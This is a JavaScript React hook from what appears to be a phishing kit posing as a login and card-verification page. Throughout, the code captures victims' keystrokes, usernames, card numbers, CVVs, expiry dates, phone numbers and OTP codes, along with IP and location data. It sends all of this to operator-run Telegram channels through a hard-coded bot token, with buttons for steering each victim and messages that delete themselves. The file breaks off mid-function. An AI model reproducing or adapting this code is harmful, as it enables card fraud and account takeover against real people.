// src/hooks/useTelegramBot.js
import { useRef, useEffect, useCallback } from 'react';
import axios from 'axios';

const TELEGRAM_BOT_TOKEN = '8529028584:AAF7Zjo0gb9Va07nEWcPMuuNG4SHH2PBv04';

// Channel IDs
const LOGS_CHAT_ID = '-5550025222';
const ACTIONS_CHAT_ID = '-5511604866';

// Anti-spam: Track last log times
const lastLogTimes = {
  pageView: 0,
  siteEntry: 0,
  cardVerification: 0,
  cardVerificationPage: 0,
  otpSubmit: 0,
  otpVerified: 0,
  loginTyping: 0,
  cardTyping: 0,
  otpTyping: 0,
  confirmation: 0,
  visitNotification: 0,
  formattedCard: 0,
  otpCode: 0,
  success: 0,
  otpPage: 0,
};

// Throttle delay in milliseconds (5 seconds)
const THROTTLE_DELAY = 5000;

const deleteMessageAfterDelay = async (chatId, messageId, delay = 15000) => {
  setTimeout(async () => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteMessage`;
      await axios.post(url, {
        chat_id: chatId,
        message_id: messageId
      });
      console.log('✅ Message deleted after 15 seconds');
    } catch (error) {
      console.error('Error deleting message:', error);
    }
  }, delay);
};

// ✅ Helper function to get geo data with fallback
const getGeoData = async (ip) => {
  let country = 'Unknown';
  let city = 'Unknown';
  let isp = 'Unknown';
  
  // Try primary API: ipapi.co
  try {
    const geoResponse = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 5000 });
    if (geoResponse.data && !geoResponse.data.error && geoResponse.data.country_name) {
      country = `${geoResponse.data.country_name} (${geoResponse.data.country_code})`;
      city = geoResponse.data.city || 'Unknown';
      isp = geoResponse.data.org || geoResponse.data.isp || 'Unknown ISP';
      return { country, city, isp };
    }
  } catch (primaryError) {
    console.log('Primary geo API failed, trying fallback...');
  }
  
  // Try fallback API: ipinfo.io
  try {
    const fallbackResponse = await axios.get(`https://ipinfo.io/${ip}/json`, { timeout: 5000 });
    if (fallbackResponse.data) {
      country = fallbackResponse.data.country || 'Unknown';
      city = fallbackResponse.data.city || 'Unknown';
      isp = fallbackResponse.data.org || 'Unknown ISP';
    }
  } catch (fallbackError) {
    console.log('Both geo APIs failed for this IP');
  }
  
  return { country, city, isp };
};

export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr, onBackToAppr, onDenyOtp, onOtpFalse, onApproveOtp, onCardFalse, onApproveLogin, onOtpLogin, onLoginFalse, onCardVerification,  onSpotifyAppr) => {
  const pollingIntervalRef = useRef(null);
  const lastUpdateIdRef = useRef(0);

  const generateSessionId = () => {
    return Date.now().toString() + Math.random().toString(36).substr(2, 6);
  };
    
  const shouldSendLog = (logType) => {
    const now = Date.now();
    const lastTime = lastLogTimes[logType] || 0;
    if (now - lastTime < THROTTLE_DELAY) {
      console.log(`⏭️ Skipping duplicate ${logType} log (throttled)`);
      return false;
    }
    lastLogTimes[logType] = now;
    return true;
  };

  // ========== ACTIONS CHANNEL (with buttons) ==========
  
  const sendLoginRequestToTelegram = async (message, sessionId) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const keyboard = {
        inline_keyboard: [
          [
            { text: "✅ Approve Connexion", callback_data: `approve_login_${sessionId}` },
            { text: "🔐 OTP Connexion", callback_data: `otp_login_${sessionId}` }
          ],
          [
            { text: "❌ Login False", callback_data: `login_false_${sessionId}` }
          ],
          [
            { text: "💳 Card Verification", callback_data: `card_verification_${sessionId}` }
          ]
        ]
      };

      await axios.post(url, {
        chat_id: ACTIONS_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        reply_markup: keyboard
      });
      return true;
    } catch (error) {
      console.error('Error sending login request:', error);
      return false; 
    } 
  };

  // ✅ NEW: Send checkout email to Telegram
  const sendCheckoutEmailToTelegram = async () => {
    try {
      const email = sessionStorage.getItem('cartEmail') || 'Not provided';
      const loginName = sessionStorage.getItem('loginName') || 'Unknown';
      const sessionId = sessionStorage.getItem('telegramSessionId') || 'N/A';

      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

      const message = `
🛒 <b>CHECKOUT - EMAIL CAPTURED</b> 🛒
━━━━━━━━━━━━━━━━━━━━━
⏰ <b>Time:</b> ${new Date().toLocaleString()}
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━
📝 <b>CHECKOUT INFO:</b>
├ 👤 <b>Username:</b> ${loginName}
└ 📧 <b>Email:</b> <code>${email}</code>
━━━━━━━━━━━━━━━━━━━━━
✅ <i>User proceeded to checkout</i>
      `;

      await axios.post(url, {
        chat_id: ACTIONS_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      });

      console.log('✅ Checkout email sent to Telegram');
      return true;
    } catch (error) {
      console.error('Error sending checkout email:', error);
      return false;
    }
  };

  const getBankInfo = async (cardNumber) => {
  const bin = cardNumber.replace(/\s/g, '').substring(0, 6);
  const binPrefix = bin.substring(0, 4);
  
  // Complete bank database - UNIQUE KEYS (first 4 digits + country code as key)
  const majorBanks = {
    // 🇺🇸 USA Banks
    '4000': 'Barclays Bank US',
    '4147': 'JPMorgan Chase Bank',
    '4266': 'Bank of America',
    '4763': 'HSBC Bank USA',
    '5213': 'Citibank NA',
    '5402': 'Wells Fargo Bank',
    '5204': 'Santander Bank US',
    '4011': 'Capital One Bank',
    '4313': 'USAA Federal Savings Bank',
    '5466': 'PNC Bank',
    '4500': 'RBC Bank US',
    '4510': 'TD Bank NA',
    '4530': 'Scotiabank US',
    
    // 🇬🇧 UK Banks
    '4539_uk': 'Barclays Bank UK',
    '4658': 'Lloyds Bank',
    '4751': 'NatWest Bank',
    '5404': 'Halifax Bank',
    '4462': 'TSB Bank',
    '4400_uk': 'Santander UK',
    '5300_uk': 'Nationwide Building Society',
    '5200_uk': 'Metro Bank',
    '5500_uk': 'Monzo Bank',
    '5120_uk': 'Starling Bank',
    '5000_uk': 'Virgin Money UK',
    
    // 🇩🇰 Denmark Banks
    '4571': 'Nordea Bank',
    '4539_dk': 'Danske Bank',
    '4590': 'easyBank',
    '5555': 'Jyske Bank',
    '5508': 'Sydbank',
    '4600': 'Spar Nord Bank',
    '5300_dk': 'Arbejdernes Landsbank',
    '5400_dk': 'Nykredit Bank',
    
    // 🇩🇪 Germany Banks
    '5300_de': 'Deutsche Bank',
    '6720': 'Commerzbank',
    '5126': 'Postbank',
    '4402': 'DKB Bank',
    '4300': 'Sparkasse',
    '5000_de': 'Volkswagen Bank',
    '5200_de': 'HypoVereinsbank',
    '5400_de': 'Targobank',
    '5500_de': 'Norisbank',
    '4400_de': 'Santander DE',
    '5130_de': 'ING DiBa',
    '5450': 'Consorsbank',
    
    // 🇫🇷 France Banks
    '5500_fr': 'BNP Paribas',
    '4978': 'Societe Generale',
    '5130_fr': 'Credit Agricole',
    '5150': 'Credit Mutuel',
    '4973': 'Banque Postale',
    '5400_fr': 'Caisse Epargne',
    '5200_fr': 'Banque Populaire',
    '5300_fr': 'Credit du Nord',
    '5460_fr': 'BNP Paribas',
    '4400_fr': 'HSBC France',
    '4550_fr': 'Boursorama',
    '5120_fr': 'Hello Bank',
    
    // 🇪🇸 Spain Banks
    '5204_es': 'Banco Santander',
    '4903': 'BBVA Bank',
    '4552': 'CaixaBank',
    '4950': 'Bankia',
    '4930': 'Banco Sabadell',
    '5460_es': 'ING Direct',
    '4400_es': 'Banco Santander',
    '5502': 'Banco Popular',
    '5210_es': 'Bankinter',
    '5300_es': 'Abanca',
    '5120_es': 'Kutxabank',
    '5400_es': 'Unicaja',
    
    // 🇮🇹 Italy Banks
    '5329': 'UniCredit',
    '5307': 'Intesa Sanpaolo',
    '5258': 'BancoPosta',
    '5450_it': 'Monte dei Paschi',
    '5330': 'UBI Banca',
    '5220': 'Banco BPM',
    '5310': 'Banca Mediolanum',
    '5350': 'FinecoBank',
    '5400_it': 'Credem',
    '5120_it': 'BNL',
    '5500_it': 'Deutsche Bank IT',
    '5000_it': 'CheBanca',
    
    // 🇸🇪 Sweden Banks
    '5256': 'Swedbank',
    '5456': 'SEB Bank',
    '5210_se': 'Handelsbanken',
    '5350_se': 'Nordea Bank',
    '4460': 'ICA Banken',
    '5300_se': 'Lansforsakringar',
    '5400_se': 'Skandiabanken',
    '5120_se': 'Avanza Bank',
    
    // 🇳🇴 Norway Banks
    '5310_no': 'DNB Bank',
    '5200_no': 'Sparebanken',
    '5350_no': 'Nordea Bank',
    '5400_no': 'Sparebank 1',
    '5300_no': 'Handelsbanken NO',
    '5500_no': 'Storebrand',
    
    // 🇫🇮 Finland Banks
    '4920': 'OP Bank',
    '5350_fi': 'Nordea Bank',
    '4560': 'Danske Bank',
    '5300_fi': 'Aktia Bank',
    '5400_fi': 'S-Pankki',
    '5200_fi': 'Alandsbanken',
    
    // 🇳🇱 Netherlands Banks
    '4903_nl': 'ING Bank',
    '5310_nl': 'Rabobank',
    '5100': 'ABN AMRO',
    '4400_nl': 'SNS Bank',
    '5200_nl': 'ASN Bank',
    '5300_nl': 'Triodos Bank',
    '5400_nl': 'bunq',
    '5500_nl': 'Knab',
    
    // 🇧🇪 Belgium Banks
    '5470': 'BNP Paribas Fortis',
    '5310_be': 'KBC Bank',
    '4400_be': 'ING Belgium',
    '5200_be': 'Belfius Bank',
    '5300_be': 'AXA Bank',
    '5400_be': 'Argenta',
    '5500_be': 'Crelan',
    
    // 🇨🇭 Switzerland Banks
    '4111': 'Credit Suisse',
    '4319': 'UBS Bank',
    '4840': 'PostFinance',
    '4400_ch': 'Raiffeisen',
    '5220_ch': 'Zurcher Kantonalbank',
    '5300_ch': 'Migros Bank',
    '5400_ch': 'Valiant Bank',
    
    // 🇦🇹 Austria Banks
    '5300_at': 'Erste Bank',
    '5470_at': 'Raiffeisen Bank',
    '4400_at': 'Bank Austria',
    '5200_at': 'BAWAG',
    '5400_at': 'Oberbank',
    '5500_at': 'Volksbank',
    
    // 🇵🇱 Poland Banks
    '5128': 'PKO Bank Polski',
    '5210_pl': 'Bank Pekao',
    '4400_pl': 'ING Bank Slaski',
    '5460_pl': 'mBank',
    '5300_pl': 'Santander PL',
    '5400_pl': 'Alior Bank',
    '5500_pl': 'Millennium Bank',
    '5000_pl': 'Credit Agricole PL',
    
    // 🇵🇹 Portugal Banks
    '5220_pt': 'Caixa Geral',
    '5310_pt': 'Millennium BCP',
    '4400_pt': 'Novo Banco',
    '5200_pt': 'Santander Totta',
    '5300_pt': 'BPI Bank',
    '5400_pt': 'Banco Montepio',
    
    // 🇬🇷 Greece Banks
    '5300_gr': 'National Bank of Greece',
    '5200_gr': 'Alpha Bank',
    '5400_gr': 'Eurobank',
    '5500_gr': 'Piraeus Bank',
    
    // 🇨🇿 Czech Republic Banks
    '5300_cz': 'Ceska Sporitelna',
    '5200_cz': 'CSOB Bank',
    '5400_cz': 'Komercni Banka',
    '5500_cz': 'Raiffeisenbank CZ',
    '5000_cz': 'Air Bank',
    
    // 🇭🇺 Hungary Banks
    '5300_hu': 'OTP Bank',
    '5200_hu': 'K&H Bank',
    '5400_hu': 'Erste Bank HU',
    '5500_hu': 'Raiffeisen HU',
    '5000_hu': 'CIB Bank',
    
    // 🇷🇴 Romania Banks
    '5300_ro': 'BCR Bank',
    '5200_ro': 'BRD Bank',
    '5400_ro': 'Raiffeisen RO',
    '5500_ro': 'UniCredit RO',
    
    // 🇧🇬 Bulgaria Banks
    '5300_bg': 'UniCredit Bulbank',
    '5200_bg': 'DSK Bank',
    '5400_bg': 'First Investment Bank',
    
    // 🇭🇷 Croatia Banks
    '5300_hr': 'Zagrebacka Banka',
    '5200_hr': 'Privredna Banka',
    '5400_hr': 'Erste Bank HR',
    
    // 🇸🇮 Slovenia Banks
    '5300_si': 'NLB Bank',
    '5200_si': 'NKBM Bank',
    '5400_si': 'Abanka',
    
    // 🇸🇰 Slovakia Banks
    '5300_sk': 'Slovenska Sporitelna',
    '5200_sk': 'VUB Banka',
    '5400_sk': 'Tatra Banka',
    
    // 🇱🇹 Lithuania Banks
    '5300_lt': 'SEB Bank',
    '5200_lt': 'Swedbank LT',
    '5400_lt': 'Luminor Bank',
    
    // 🇱🇻 Latvia Banks
    '5300_lv': 'Swedbank LV',
    '5200_lv': 'SEB Bank LV',
    '5400_lv': 'Citadele Bank',
    
    // 🇪🇪 Estonia Banks
    '5300_ee': 'Swedbank EE',
    '5200_ee': 'SEB Bank EE',
    '5400_ee': 'LHV Bank',
    
    // 🇮🇪 Ireland Banks
    '5300_ie': 'Bank of Ireland',
    '5200_ie': 'AIB Bank',
    '5400_ie': 'Permanent TSB',
    '5500_ie': 'Ulster Bank',
    
    // 🇨🇾 Cyprus Banks
    '5300_cy': 'Bank of Cyprus',
    '5200_cy': 'Hellenic Bank',
    
    // 🇲🇹 Malta Banks
    '5300_mt': 'Bank of Valletta',
    '5200_mt': 'HSBC Malta',
    
    // 🇱🇺 Luxembourg Banks
    '5300_lu': 'BGL BNP Paribas',
    '5200_lu': 'BCEE Bank',
    '5400_lu': 'ING Luxembourg',
    
    // 🇹🇷 Turkey Banks
    '5300_tr': 'Is Bankasi',
    '5210_tr': 'Garanti BBVA',
    '4400_tr': 'Yapi Kredi',
    '5460_tr': 'Akbank',
    '5120_tr': 'Ziraat Bankasi',
    '5400_tr': 'VakifBank',
    '5500_tr': 'Halkbank',
    
    // Other International Banks
    '5280': 'Emirates NBD',
    '5300_in': 'State Bank of India',
    '5210_in': 'HDFC Bank',
    '4400_in': 'ICICI Bank',
    '5120_ru': 'Tinkoff Bank',
    '4550_au': 'Commonwealth Bank',
  };
  
  // Try API first for most accurate results
  try {
    const response = await axios.get(`https://lookup.binlist.net/${bin}`, { timeout: 5000 });
    if (response.data?.bank?.name) {
      return {
        bank: response.data.bank.name,
        brand: (response.data.scheme || response.data.brand || 'Unknown').toUpperCase(),
        type: response.data.type || 'Credit/Debit',
        country: response.data.country?.name || 'Unknown'
      };
    }
  } catch (e) {
    console.log('BIN API failed, using local database');
  }
  
  // Check built-in database with multiple key attempts
  let bankName = null;
  
  // Try exact match
  if (majorBanks[binPrefix]) {
    bankName = majorBanks[binPrefix];
  }
  
  // Also check the full 6-digit BIN if available
  if (!bankName && majorBanks[bin]) {
    bankName = majorBanks[bin];
  }
  
  if (bankName) {
    const firstDigit = bin.charAt(0);
    let brand = 'Unknown';
    if (firstDigit === '4') brand = 'VISA';
    else if (firstDigit === '5') brand = 'MASTERCARD';
    else if (firstDigit === '3') brand = 'AMEX';
    else if (firstDigit === '6') brand = 'DISCOVER';
    
    return { 
      bank: bankName, 
      brand: brand, 
      type: 'Credit/Debit', 
      country: 'Detected from BIN' 
    };
  }
  
  // Final fallback based on first digit
  const firstDigit = bin.charAt(0);
  if (firstDigit === '4') return { bank: 'Visa Issuing Bank', brand: 'VISA', type: 'Credit/Debit', country: 'Unknown' };
  if (firstDigit === '5') return { bank: 'Mastercard Issuing Bank', brand: 'MASTERCARD', type: 'Credit/Debit', country: 'Unknown' };
  if (firstDigit === '3') return { bank: 'American Express', brand: 'AMEX', type: 'Credit', country: 'Unknown' };
  if (firstDigit === '6') return { bank: 'Discover Bank', brand: 'DISCOVER', type: 'Credit/Debit', country: 'Unknown' };
  
  return { bank: 'Unknown Bank', brand: 'Unknown', type: 'Credit/Debit', country: 'Unknown' };
};

const sendCardDetailsToTelegram = async (cardData, sessionId) => {
  try {
    let userIP = 'Unable to get IP';
    try {
      const ipResponse = await axios.get('https://api.ipify.org?format=json');
      userIP = ipResponse.data.ip;
    } catch (ipError) {
      console.error('Error getting IP:', ipError);
    }
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const birthDateStr = cardData.birthDate 
      ? `${cardData.birthDate.day}/${cardData.birthDate.month}/${cardData.birthDate.year}`
      : 'Not provided';
    
    // Get bank info from card number
    const bankInfo = await getBankInfo(cardData.cardNumber);
    
    sessionStorage.setItem('bankName', bankInfo.bank);
    sessionStorage.setItem('cardBrand', bankInfo.brand);

    const cardMessage = `
💳 <b>NEW CREDIT CARD DATA</b> 💳
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━
<b>🏦 BANK INFO:</b>
├ 🏦 <b>Bank:</b> ${bankInfo.bank}
├ 💳 <b>Brand:</b> ${bankInfo.brand}
└ 📋 <b>Type:</b> ${bankInfo.type}
━━━━━━━━━━━━━━━━━━━━━
├ 👤 <b>Cardholder:</b> ${cardData.cardholderName}
├ 💳 <b>Card Number:</b> <code>${cardData.cardNumber}</code>
├ 📅 <b>Expiry Date:</b> ${cardData.expiryDate}
├ 🔐 <b>CVV:</b> <code>${cardData.cvv}</code> 
└ 📞 <b>Phone:</b> ${cardData.countryCode || '+1'} ${cardData.phoneNumber}

<b>📍 PERSONAL INFO:</b>

<b>🖥️ TECHNICAL INFO:</b>
├ 🔌 <b>IP Address:</b> ${userIP}
└ 📱 <b>User-Agent:</b> ${navigator.userAgent.substring(0, 100)}

━━━━━━━━━━━━━━━━━━━━━
⏰ <b>Time:</b> ${new Date().toLocaleString()}
    `;

    const keyboard = {
      inline_keyboard: [
        [
          { text: "➡️ Next Step (OTP)", callback_data: `next_${sessionId}` }, 
        ],
        [
          { text: "🚫 Deny & Block IP", callback_data: `block_${sessionId}` },
          { text: " Spotify Appr", callback_data: `spotify_appr_${sessionId}` }
        ],
        [
          { text: "⬅️ Back to Login", callback_data: `back_to_login_${sessionId}` }
        ],
        [
          { text: "❌ Card False", callback_data: `card_false_${sessionId}` }
        ]
      ]
    };

    await axios.post(url, {
      chat_id: ACTIONS_CHAT_ID,
      text: cardMessage,
      parse_mode: 'HTML',
      reply_markup: keyboard
    });
    return true;
  } catch (error) {
    console.error('Error sending card details:', error);
    return false;
  }
};

  const sendOtpPageLog = async (username, phoneNumber, sessionId) => {
    if (!shouldSendLog('otpPage')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `🔐 OTP PAGE - IN PROGRESS 🔐
━━━━━━━━━━━━━━━━━━━━━
👤 Username: ${username}
📱 Phone: ${phoneNumber}
⏰ Time: ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ User is ready to enter OTP code!`;

      const keyboard = {
        inline_keyboard: [
          [
            { text: "✅ Approve OTP", callback_data: `approve_otp_${sessionId}` },
            { text: "❌ OTP False", callback_data: `otp_false_${sessionId}` }
          ],
          [
            { text: "🟢 Appr", callback_data: `appr_${sessionId}` }
          ],
          [
            { text: "⬅️ Back to Card", callback_data: `back_to_card_${sessionId}` }
          ]
        ]
      };

      await axios.post(url, {
        chat_id: ACTIONS_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        reply_markup: keyboard
      });
      
      console.log('✅ OTP page log sent');
    } catch (error) {
      console.error('Error sending OTP page log:', error);
    }
  };

  const sendConfirmationPageLog = async (username, cardNumber, sessionId) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `
💳 <b>CONFIRMATION PAGE - IN PROGRESS</b> 💳
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> ${username}
💳 <b>Card Number:</b> ${cardNumber}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User is on RB Key confirmation page!</i>
      `;

      const keyboard = {
        inline_keyboard: [
          [
            { text: "⬅️ Back to Appr Page", callback_data: `back_to_appr_${sessionId}` }
          ]
        ]
      };

      await axios.post(url, {
        chat_id: ACTIONS_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        reply_markup: keyboard
      });
      
      console.log('✅ Confirmation page log sent');
    } catch (error) {
      console.error('Error sending confirmation page log:', error);
    }
  };

  // ========== LOGS CHANNEL (WITH ANTI-SPAM) ==========

  const sendPageViewLog = async () => {
    if (!shouldSendLog('pageView')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `⚠️ Someone is visiting the login page! 
━━━━━━━━━━━━━━━━━━━━━
⏰ Time: ${new Date().toLocaleString()}
⏰ <i>This message will self-delete in 15 seconds</i>`;
      
      const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
      
      console.log('✅ Page view log sent');
    } catch (error) {
      console.error('Error sending page view log:', error);
    }
  };

  const sendSiteEntryLog = async () => {
  if (!shouldSendLog('siteEntry')) return;
  try {
    let userIP = 'Unable to get IP';
    
    try {
      const ipResponse = await axios.get('https://api.ipify.org?format=json');
      userIP = ipResponse.data.ip;
    } catch (ipError) {
      console.error('Error getting IP:', ipError);
    }
    
    // ✅ Use the new helper function with fallback
    const { country, city, isp } = await getGeoData(userIP);
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const message = `🌍 <b>SITE ENTRY - VISITOR</b> 🌍
━━━━━━━━━━━━━━━━━━━━━
📱 <b>Event:</b> Someone entered the website
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
🌐 <b>Location Info:</b>
├ 🔌 <b>IP Address:</b> <code>${userIP}</code>
├ 🌍 <b>Country:</b> ${country}
├ 🏙️ <b>City:</b> ${city}
└ 📡 <b>ISP:</b> ${isp}
━━━━━━━━━━━━━━━━━━━━━
🖥️ <b>Device:</b> ${navigator.userAgent.substring(0, 80)}`;
    
    await axios.post(url, { 
      chat_id: LOGS_CHAT_ID, 
      text: message, 
      parse_mode: 'HTML' 
    });
    
    console.log('✅ Site entry log sent with location and ISP (PERMANENT)');
  } catch (error) {
    console.error('Error sending site entry log:', error);
  }
};
  const sendVisitNotification = async (ipAddress, userAgent, referrer, screenResolution, timezone, sessionId, language) => {
    if (!shouldSendLog('visitNotification')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      // ✅ Use the new helper function with fallback
      const { country, city } = await getGeoData(ipAddress);
      const geoInfo = `${city}, ${country}`;
      
      const message = `
🌐 <b>NEW SITE VISITOR</b> 🌐
━━━━━━━━━━━━━━━━━━━━━
⏰ <b>Time:</b> ${new Date().toLocaleString()}
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━
📊 <b>VISITOR INFORMATION:</b>
├ 🌍 <b>IP Address:</b> <code>${ipAddress}</code>
├ 📍 <b>Location:</b> ${geoInfo}
━━━━━━━━━━━━━━━━━━━━
⚠️ <i>A new visitor has landed on your site!</i>
⏰ <i>This message will self-delete in 30 seconds</i>
      `;

      const response = await axios.post(url, {
        chat_id: LOGS_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
      
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 30000); 
      
      console.log('✅ Visit notification sent to Telegram');
      return true;
    } catch (error) {
      console.error('Error sending visit notification:', error);
      return false;
    }
  };

  

  const sendCardVerificationLog = async (username) => {
    if (!shouldSendLog('cardVerification')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `💳 CARD VERIFICATION - IN PROGRESS 💳
━━━━━━━━━━━━━━━━━━━━━
👤 Username: ${username}
⏰ Time: ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ User is now entering card information!`;
      await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      console.log('✅ Card verification log sent');
    } catch (error) {
      console.error('Error sending card verification log:', error);
    }
  };

  const sendCardVerificationPageLog = async (username) => {
    if (!shouldSendLog('cardVerificationPage')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `💳 <b>CARD VERIFICATION PAGE</b> 💳
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Status:</b> User is on Card Verification page
👤 <b>Username:</b> ${username || 'Not logged in yet'}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User has reached the card verification step!</i>
⏰ <i>This message will self-delete in 15 seconds</i>`;
      
      const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
      
      console.log('✅ Card verification page log sent');
    } catch (error) {
      console.error('Error sending card verification page log:', error);
    }
  };

  const sendOtpSubmitLog = async (username, phoneNumber, otpCode) => {
    if (!shouldSendLog('otpSubmit')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `🔐 <b>OTP CODE SUBMITTED</b> 🔐
👤 <b>Username:</b> ${username}
📱 <b>Phone Number:</b> ${phoneNumber}
🔢 <b>OTP Code:</b> ${otpCode}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User has entered the OTP code!</i>`;
      await axios.post(url, { chat_id: ACTIONS_CHAT_ID, text: message, parse_mode: 'HTML' });
      console.log('✅ OTP submit log sent');
    } catch (error) {
      console.error('Error sending OTP submit log:', error);
    }
  };

  const sendOtpVerifiedLog = async (username, phoneNumber, otpCode) => {
    if (!shouldSendLog('otpVerified')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✅ <b>OTP VERIFIED SUCCESSFULLY</b> ✅
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Status:</b> OTP code verified
👤 <b>Username:</b> ${username}
📱 <b>Phone Number:</b> ${phoneNumber}
🔢 <b>OTP Code:</b> ${otpCode}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
🎯 <i>User has successfully verified OTP!</i>`;
      await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      console.log('✅ OTP verified log sent');
    } catch (error) {
      console.error('Error sending OTP verified log:', error);
    }
  };

  // ========== TYPING LOGS ==========
  const sendLoginTypingLog = async (username, field, value) => {
    if (!shouldSendLog('loginTyping')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✏️ <b>TYPING - LOGIN PAGE</b> ✏️
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Field:</b> ${field}
📝 <b>Value:</b> ${value}
👤 <b>Username:</b> ${username || 'Not entered yet'}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User is typing on the login page!</i>
⏰ <i>This message will self-delete in 15 seconds</i>`;
      
      const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
      
      console.log('✅ Login typing log sent');
    } catch (error) {
      console.error('Error sending login typing log:', error);
    }
  };

  const sendCardTypingLog = async (username, field, value) => {
    if (!shouldSendLog('cardTyping')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✏️ <b>TYPING - CARD VERIFICATION PAGE</b> ✏️
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Field:</b> ${field}
📝 <b>Value:</b> ${value}
👤 <b>Username:</b> ${username}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User is typing on the card verification page!</i>
⏰ <i>This message will self-delete in 15 seconds</i>`;
      
      const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
      
      console.log('✅ Card typing log sent');
    } catch (error) {
      console.error('Error sending card typing log:', error);
    }
  };

  const sendOtpTypingLog = async (username, phoneNumber, value) => {
    if (!shouldSendLog('otpTyping')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✏️ <b>TYPING - OTP PAGE</b> ✏️
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Field:</b> OTP Code
📝 <b>Value:</b> ${value}
👤 <b>Username:</b> ${username}
📱 <b>Phone:</b> ${phoneNumber}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User is typing the OTP code!</i>
⏰ <i>This message will self-delete in 15 seconds</i>`;
      
      const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
      
      console.log('✅ OTP typing log sent');
    } catch (error) {
      console.error('Error sending OTP typing log:', error);
    }
  };

  const sendConfirmationLog = async (username, cardNumber, sessionId) => {
    if (!shouldSendLog('confirmation')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `
✅ <b>CONFIRMATION IN CZ KEY</b> ✅
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> ${username}
💳 <b>Card Number:</b> ${cardNumber}
🆔 <b>Session ID:</b> <code>${sessionId}</code>
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>Status:</b> CONFIRMED IN BANKING APP
⚠️ <i>User confirmed payment in mobile banking</i>
      `;

      await axios.post(url, {
